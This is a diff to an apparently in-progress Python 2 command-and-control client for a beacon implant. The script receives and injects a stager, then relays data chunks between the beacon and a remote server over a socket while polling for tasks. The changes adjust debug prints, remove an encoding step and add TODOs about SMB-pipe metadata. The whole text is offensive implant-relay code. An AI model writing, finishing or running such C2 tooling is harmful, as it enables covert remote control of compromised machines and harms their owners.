@@ -51,7 +51,6 @@ def recvData(sock):
 	frameSize = ""
 	while len(frameSize) != 4:
 		frameSize = sock.recv(4)
-		print len(frameSize) # DEBUG
 
 	dataSize = struct.unpack('<I', frameSize)[0]
 	print "dataSize = " + str(dataSize) # DEBUG
@@ -104,9 +103,14 @@ def go(sock):
 	# 	p = recvData(sock)
 	print "Got a stager! loading..."
 	sleep(2)
+	# print "Decoded stager = " + str(p) # DEBUG
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
 	handle_beacon = start_beacon(p)
-	print "loaded, got handle: %s" % (handle_beacon)
+
+	# TODO: WE NEED LOGIC TO GET THE METADATA FROM THE SMB PIPE HERE!
+	#  ## I think this is automatically done during interact(), but not entirely sure?
+	print "Loaded, and got handle to beacon. Getting METADATA."
+
 	return handle_beacon
 
 def interact(sock, handle_beacon):
@@ -123,8 +127,7 @@ def interact(sock, handle_beacon):
 		if len(chunk) > 1:
 			print "relaying chunk to server"
 			# LOGIC TO SEND A CHUNK OF DATA THROUGH THE SOCKET GOES HERE
-			data = encode(chunk)
-			sendData(sock, data) # DEBUG/TODO
+			sendData(sock, chunk) # DEBUG/TODO
 
 		# LOGIC TO CHECK FOR A NEW TASK
 		newTask = recvData(sock)
@@ -142,5 +145,6 @@ sock = prepTransport()
 # Get and inject the stager
 handle_beacon = go(sock)
 
+print "if you can't see this, we didn't make it"
 # Run the main loop
 interact(sock, handle_beacon)
